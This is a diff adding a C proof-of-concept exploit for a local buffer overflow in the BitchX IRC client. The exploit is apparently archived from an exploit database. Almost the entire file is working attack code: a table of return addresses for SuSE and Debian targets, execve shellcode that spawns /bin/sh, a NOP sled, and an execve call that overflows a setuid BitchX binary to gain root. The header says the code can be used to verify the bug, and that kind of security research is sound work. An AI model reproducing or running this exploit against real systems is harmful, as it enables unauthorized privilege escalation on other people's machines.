@@ -1,0 +1,102 @@
+/* Tested on BitchX-1.0c19 /str0ke */
+/*
+ * P.o.C Exploit Code for BitchX
+ * made for Version (BitchX-1.0c20cvs) -- Date (20020325)
+ *
+ * (C) 2004. GroundZero Security Research and Software Development
+ *           http://www.groundzero-security.com 
+ *
+ * released under the GNU GPL - http://www.gnu.org/licenses/gpl.txt
+ *
+ * --[ background
+ *
+ * BitchX contains an local exploitable Buffer Overflow condition.
+ * Sometimes it is installed setUID to allow non-root users SSL
+ * access for example and therfore it could be used by a mallicious
+ * local user, to obtain root access. This code demonstrates the
+ * described vulnerability and can be used to verify the bug on
+ * your system(s).
+ */
+
+#include <stdio.h>
+
+struct {
+  char *distro;
+  char *version;
+  char *bx;
+  unsigned int return_add;
+  unsigned int buff_size;
+} T[] = {
+            { "SuSE Linux",   "8.2", "BitchX-1.0c20cvs", 0xbfffff88, 2111 },
+            { "Debian Linux", "3.0", "BitchX-1.0c19",    0xbfffff5c, 2090 },
+            { "END",          "",    "",                 0,          0    },
+        }; 
+
+char shellcode[]="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+                 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+                 "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int usage(char *argv)
+{
+    int i;
+
+    fprintf (stdout, "\nUsage: %s <path+bin>\n",argv);
+    fprintf (stdout, " i.e.: %s /bin/BitchX\n\n",argv);
+    fprintf (stdout, "Available Targets:\n");
+    for(i=0;T[i].distro!="END";i++)
+    fprintf (stdout, "\t\t\t %i: (%s %s) %s\n",i,T[i].distro,T[i].version,T[i].bx);
+
+    return(0);
+}
+     
+int main(int argc, char *argv[])
+{
+    unsigned int i;
+    unsigned int t;
+
+    char buffer[3000];
+    char *a1     = "sh";
+    char *a2     = "-c";
+    char *env[]  = { "TERM=xterm", 0 };    
+    char *args[] = { a1, a2, buffer, 0};  /* arguments list */
+
+    fprintf (stdout, "\n\n#############################################################\n");
+    fprintf (stdout, "### GroundZero Security Research and Software Development ###\n");
+    fprintf (stdout, "### Linux Local P.o.C Exploit for BitchX                  ###\n");
+    fprintf (stdout, "#############################################################\n\n");
+ 
+    if(argv[1]==NULL||argv[2]==NULL)
+    {
+        usage (argv[0]);
+        fprintf (stdout, "\n");
+        exit (0);
+    }
+
+    if(strlen(argv[1])>255||strlen(argv[2])>255)
+    {
+        exit (-1); 
+    }
+
+    t=atoi(argv[2]); 
+
+    fprintf (stdout, "selected: %s %s %s\n",T[t].distro,T[t].version,T[t].bx); 
+    fprintf (stdout, "using return address: 0x%lx\n",T[t].return_add);
+
+    for ( i=0; i<T[t].buff_size; i+=4) *(long *)&buffer[i]=T[t].return_add;  /* put return address in buffer */
+    for ( i=0; i<(T[t].buff_size-strlen(shellcode)-40); ++i) *(buffer+i)=0x90; /* add nop's */
+
+    memcpy (buffer+i,shellcode,strlen(shellcode));  /* generate exploit string */
+
+    fprintf (stdout, "Launching Exploit against %s, you got 3 seconds to abort.. (ctrl+c)\n",argv[1]);
+    sleep(3);
+
+    if((execve (argv[1],args,env))==-1)  /* execute binary and smash the stack */
+    {
+        perror("execve");
+        exit (-1);
+    }
+
+    exit (0);
+}
+
+// milw0rm.com [2005-04-21]
